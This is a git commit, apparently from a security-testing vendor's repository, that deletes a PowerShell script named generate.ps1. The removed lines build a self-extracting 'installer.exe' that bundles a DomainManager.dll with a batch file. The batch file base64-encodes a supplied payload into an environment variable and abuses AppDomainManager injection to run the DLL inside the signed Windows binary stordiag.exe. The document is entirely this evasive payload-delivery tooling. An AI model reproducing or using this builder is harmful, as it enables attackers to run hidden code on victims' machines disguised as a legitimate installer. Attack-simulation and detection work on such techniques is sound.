60e7c5eb4e532ae157f138e21beab26667e92793
Süleyman Özarslan <suleyman@picussecurity.com>
2020-10-14 17:25:13 +0300

    Delete generate.ps1

--- generate.ps1
+++
@@ -1,9 +0,0 @@
-$Bytes = [System.Text.Encoding]::UTF8.GetBytes($Args[0])
-$b64text =[Convert]::ToBase64String($Bytes)
-echo "@echo off" | Add-Content -Path setup.bat -Encoding ascii
-echo "set APPDOMAIN_MANAGER_ASM=DomainManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" | Add-Content -Path setup.bat -Encoding ascii
-echo "set APPDOMAIN_MANAGER_TYPE=DomainManager.InjectedDomainManager" | Add-Content -Path setup.bat -Encoding ascii
-echo "set SHLCD=$b64text" | Add-Content -Path setup.bat -Encoding ascii
-echo "stordiag.exe /?" | Add-Content -Path setup.bat -Encoding ascii
-.\7za.exe a payload.7z DomainManager.dll setup.bat
-cmd.exe /c "copy /b 7zSD.sfx + config.txt + payload.7z installer.exe"
